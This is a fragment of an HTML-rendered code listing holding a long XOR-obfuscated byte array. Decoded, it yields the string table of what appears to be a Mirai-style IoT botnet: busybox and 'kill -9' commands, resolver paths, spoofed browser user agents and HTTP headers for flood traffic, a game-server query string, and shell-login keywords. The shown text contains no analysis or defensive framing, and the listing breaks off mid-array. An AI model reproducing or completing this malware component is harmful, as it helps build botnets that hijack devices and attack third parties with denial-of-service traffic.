</span><br><span class="line"><span class="number">0x54</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x1B</span>, <span class="number">0x11</span>, <span class="number">0x6D</span>, <span class="number">0x44</span>, <span class="number">0x48</span>, <span class="number">0x6A</span>, <span class="number">0x78</span>, </span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x58</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x4A</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x75</span>, </span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x6A</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x51</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x16</span>, <span class="number">0x62</span>, <span class="number">0x64</span>, <span class="number">0x14</span>, <span class="number">0x64</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x60</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x40</span>, </span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x4B</span>, <span class="number">0x43</span>, <span class="number">0x65</span>, <span class="number">0x54</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x40</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x4F</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x5B</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x66</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x66</span>, </span><br><span class="line"><span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x02</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x56</span>, <span class="number">0x02</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x57</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x5B</span>, <span class="number">0x40</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x02</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x5B</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x49</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0x1B</span>, <span class="number">0x02</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x4D</span>, <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x67</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x73</span>, <span class="number">0x57</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x5B</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x51</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x54</span>, <span class="number">0x0C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x44</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x43</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x51</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x0F</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x54</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x4D</span>, <span class="number">0x49</span>, <span class="number">0x4B</span>, <span class="number">0x47</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x0F</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x4D</span>, <span class="number">0x49</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x0F</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x56</span>, <span class="number">0x4A</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x50</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x51</span>, <span class="number">0x44</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x0F</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x46</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>, <span class="number">0x57</span>, <span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x18</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x43</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x57</span>, <span class="number">0x46</span>, <span class="number">0x44</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x0F</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x5A</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x43</span>, <span class="number">0x51</span>, </span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x55</span>, <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x49</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x4B</span>, <span class="number">0x50</span>, <span class="number">0x4A</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x43</span>, <span class="number">0x46</span>, <span class="number">0x13</span>, <span class="number">0x48</span>, <span class="number">0x11</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x4B</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x56</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x5A</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x4A</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x0E</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x4A</span>, <span class="number">0x56</span>, <span class="number">0x4F</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x09</span>, <span class="number">0x5A</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x0E</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x41</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x4F</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x19</span>, <span class="number">0x53</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x1B</span>, <span class="number">0x0E</span>, <span class="number">0x4B</span>, <span class="number">0x4F</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x0D</span>, <span class="number">0x55</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x52</span>, <span class="number">0x0E</span>, <span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x08</span>, <span class="number">0x19</span>, <span class="number">0x53</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x1A</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x56</span>, <span class="number">0x0F</span>, <span class="number">0x6E</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x0F</span>, </span><br><span class="line"><span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0x0E</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x19</span>, <span class="number">0x53</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x1A</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x0F</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0x52</span>, <span class="number">0x47</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x41</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x0F</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x0F</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x0F</span>, <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x0A</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x51</span>, <span class="number">0x02</span>, <span class="number">0x6C</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x6D</span>, </span><br><span class="line"><span class="number">0x75</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x63</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x75</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x69</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, </span><br><span class="line"><span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x76</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, </span><br><span class="line"><span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x61</span>, <span class="number">0x4A</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x13</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x10</span>, <span class="number">0x15</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, </span><br><span class="line"><span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x02</span>, <span class="number">0x71</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x6F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x51</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x6C</span>, <span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x75</span>, <span class="number">0x6D</span>, <span class="number">0x75</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x63</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x75</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x69</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, </span><br><span class="line"><span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x76</span>, </span><br><span class="line"><span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x61</span>, <span class="number">0x4A</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x10</span>, <span class="number">0x15</span>, </span><br><span class="line"><span class="number">0x16</span>, <span class="number">0x11</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x71</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x50</span>, <span class="number">0x4B</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x55</span>, <span class="number">0x51</span>, <span class="number">0x02</span>, <span class="number">0x6C</span>, <span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x14</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0x19</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x6D</span>, <span class="number">0x75</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x63</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x75</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x69</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x61</span>, <span class="number">0x4A</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x13</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x10</span>, </span><br><span class="line"><span class="number">0x15</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x02</span>, <span class="number">0x71</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x50</span>, <span class="number">0x4B</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, </span><br><span class="line"><span class="number">0x14</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x51</span>, <span class="number">0x02</span>, <span class="number">0x6C</span>, <span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x14</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x6D</span>, <span class="number">0x75</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x75</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x69</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, </span><br><span class="line"><span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x76</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x61</span>, </span><br><span class="line"><span class="number">0x4A</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x0D</span>, <span 